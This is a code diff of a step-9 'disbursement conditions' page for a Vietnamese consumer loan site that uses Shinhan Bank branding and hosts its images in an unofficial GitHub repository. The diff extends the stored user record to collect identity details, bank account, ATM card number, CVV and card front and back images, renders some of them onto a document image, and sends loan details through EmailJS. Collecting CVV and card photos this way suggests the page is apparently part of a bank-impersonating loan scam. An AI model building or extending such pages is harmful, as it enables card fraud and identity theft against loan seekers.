@@ -65,7 +65,8 @@
         }
         #disbursementCanvas {
             width: 100%;
-            max-width: 360px;
+            max-width: 600px;
+            min-height: 850px;
             margin: 20px auto;
             display: block;
             border: 2px solid #e9ecef;
@@ -189,36 +190,54 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
-        // Initialize EmailJS with the correct User ID
+        // Initialize EmailJS
         (function(){
             emailjs.init("OrBsI926QI2_xBh1f");
         })();
 
-        // Placeholder user data
+        // Placeholder user data (aligned with Step1)
         let userData = {
-            accountNumber: "",
             fullName: "",
-            bankName: "",
             idNumber: "",
             idIssueDate: "",
             idIssuePlace: "",
-            loanCode: "",
-            loanAmount: "",
-            registrationDate: "",
+            address: "",
+            occupation: "",
+            income: "",
+            phoneNumber: "",
             email: "",
+            loanAmount: "",
+            loanTerm: "",
+            loanPurpose: "",
+            accountNumber: "",
+            bankName: "",
+            termsAgree: false,
+            loanCode: "",
+            registrationDate: "",
+            monthlyPayment: 0,
+            interestRate: 0,
+            sellerCode: "",
+            storeCode: "",
+            staffCode: "",
+            staffName: "",
+            branchName: "",
+            isRegistered: false,
+            qrData: {},
             atmCard: {
                 cardNumber: "",
                 cardHolderName: "",
                 issueDate: "",
                 expiryDate: "",
-                cvv: ""
+                cvv: "",
+                frontImage: "",
+                backImage: ""
             },
             currentStep: 9
         };
 
         // Format number to VND
         function formatNumber(number) {
-            if (!number) return "";
+            if (!number) return "Không có";
             return Number(number).toLocaleString('vi-VN');
         }
 
@@ -238,7 +257,7 @@
                 const storedData = localStorage.getItem('userData');
                 if (storedData) {
                     userData = JSON.parse(storedData);
-                    console.log('Loaded userData from localStorage:', userData);
+                    console.log('Loaded userData from localStorage for Step9:', userData);
                 } else {
                     console.warn('No userData found in localStorage, using default.');
                 }
@@ -247,35 +266,23 @@
             }
         }
 
-        // Define text fields for canvas (adjusted for 2480px x 3508px, 300 DPI)
-        const canvasFields = [
-            { label: "", value: userData.loanCode || "", x: 414, y: 127, font: "58px Arial bold", color: "#000000" },
-            { label: "", value: userData.accountNumber || "", x: 846, y: 643, font: "50px Arial bold", color: "#000000" },
-            { label: "", value: userData.fullName || "", x: 857, y: 707, font: "50px Arial bold", color: "#000000" },
-            { label: "", value: userData.bankName || "", x: 846, y: 780, font: "50px Arial bold", color: "#000000" },
-            { label: "", value: userData.fullName || "", x: 857, y: 887, font: "50px Arial bold", color: "#000000" },
-            { label: "", value: userData.idNumber || "", x: 846, y: 974, font: "50px Arial bold", color: "#000000" },
-            { label: "", value: userData.idIssueDate || "", x: 1413, y: 974, font: "50px Arial bold", color: "#000000" },
-            { label: "", value: userData.idIssuePlace || "", x: 1904, y: 974, font: "50px Arial bold", color: "#000000" },
-            { label: "", value: userData.loanCode || "", x: 414, y: 193, font: "58px Arial bold", color: "#000000" },
-            { label: "", value: userData.atmCard?.cardNumber || "", x: 846, y: 1034, font: "50px Arial bold", color: "#000000" },
-            { label: "", value: userData.atmCard?.cardHolderName || "", x: 846, y: 1094, font: "50px Arial bold", color: "#000000" }
-        ];
-
         // Render image and text on canvas
-        function renderCanvas(canvasId, imageUrl) {
+        function renderCanvas(canvasId, imageUrl, fallbackUrl) {
             const canvas = document.getElementById(canvasId);
             const ctx = canvas.getContext('2d');
             const img = new Image();
             img.crossOrigin = "Anonymous";
             img.src = imageUrl;
 
+            canvas.classList.add('loading');
+
             img.onload = function() {
+                canvas.classList.remove('loading');
                 canvas.width = 2480;
                 canvas.height = 3508;
                 ctx.drawImage(img, 0, 0, 2480, 3508);
                 canvasFields.forEach(field => {
-                    const value = field.value || "";
+                    const value = field.value || "Không có";
                     if (field.x >= 0 && field.y >= 0 && field.x < canvas.width && field.y < canvas.height) {
                         ctx.font = field.font;
                         ctx.fillStyle = field.color;
@@ -284,15 +291,43 @@
                         console.warn(`Invalid coordinates for field: ${value} at (${field.x}, ${field.y})`);
                     }
                 });
+                console.log('Rendered canvas with fields:', canvasFields.map(f => ({ value: f.value, x: f.x, y: f.y })));
             };
 
             img.onerror = function() {
                 console.error('Failed to load image:', imageUrl);
-                ctx.fillStyle = '#000000';
-                ctx.font = '50px Arial';
-                ctx.fillText('Không thể tải hình ảnh điều kiện giải ngân.', 20, 50);
+                img.src = fallbackUrl;
+                img.onload = function() {
+                    canvas.classList.remove('loading');
+                    canvas.width = 2480;
+                    canvas.height = 3508;
+                    ctx.drawImage(img, 0, 0, 2480, 3508);
+                    ctx.fillStyle = '#000000';
+                    ctx.font = '46px Arial';
+                    ctx.fillText('Hình ảnh điều kiện giải ngân mặc định.', 20, 50);
+                };
+                img.onerror = function() {
+                    canvas.classList.remove('loading');
+                    ctx.fillStyle = '#000000';
+                    ctx.font = '46px Arial';
+                    ctx.fillText('Không thể tải hình ảnh điều kiện giải ngân.', 20, 50);
+                };
             };
         }
+
+        // Define text fields for canvas
+        const canvasFields = [
+            { label: "", value: userData.loanCode || "Không có", x: 414, y: 193, font: "54px Arial bold", color: "#000000" },
+            { label: "", value: userData.accountNumber || "Không có", x: 846, y: 643, font: "46px Arial bold", color: "#000000" },
+            { label: "", value: userData.fullName || "Không có", x: 857, y: 707, font: "46px Arial bold", color: "#000000" },
+            { label: "", value: userData.bankName || "Không có", x: 846, y: 780, font: "46px Arial bold", color: "#000000" },
+            { label: "", value: userData.fullName || "Không có", x: 857, y: 887, font: "46px Arial bold", color: "#000000" },
+            { label: "", value: userData.idNumber || "Không có", x: 846, y: 974, font: "46px Arial bold", color: "#000000" },
+            { label: "", value: userData.idIssueDate || "Không có", x: 1413, y: 974, font: "46px Arial bold", color: "#000000" },
+            { label: "", value: userData.idIssuePlace || "Không có", x: 1904, y: 974, font: "46px Arial bold", color: "#000000" },
+            { label: "", value: userData.atmCard?.cardNumber || "Không có", x: 846, y: 1034, font: "46px Arial bold", color: "#000000" },
+            { label: "", value: userData.atmCard?.cardHolderName || "Không có", x: 846, y: 1094, font: "46px Arial bold", color: "#000000" }
+        ];
 
         // Download canvas as PDF
         function downloadAsPDF(canvas, filename) {
@@ -309,8 +344,7 @@
         // Load user data and populate fields
         window.onload = function() {
             loadUserData();
-            console.log('Rendering canvas with userData:', userData);
-            renderCanvas('disbursementCanvas', 'https://raw.githubusercontent.com/vaytieudung/shinhanbank/main/assets/img/dieukiengiayngan.png');
+            renderCanvas('disbursementCanvas', 'https://raw.githubusercontent.com/vaytieudung/shinhanbank/main/assets/img/dieukiengiayngan.png', 'https://via.placeholder.com/2480x3508?text=Hinh+Dieu+Kien+Giai+Ngan');
         };
 
         // Download disbursement conditions
@@ -322,10 +356,10 @@
         // Proceed to final step
         $('#proceedToFinalStepBtn').on('click', function() {
             const params = {
-                to_name: userData.fullName || '',
-                loan_code: userData.loanCode || '',
-                loan_amount: formatNumber(userData.loanAmount) || '',
-                registration_date: userData.registrationDate || '',
+                to_name: userData.fullName || 'Khách hàng',
+                loan_code: userData.loanCode || 'Không có',
+                loan_amount: formatNumber(userData.loanAmount) || 'Không có',
+                registration_date: userData.registrationDate || 'Không có',
                 to_email: userData.email || 'support@shinhan.com.vn'
             };
             emailjs.send('service_60tgxof', 'template_uhyb8ve', params).then(() => {
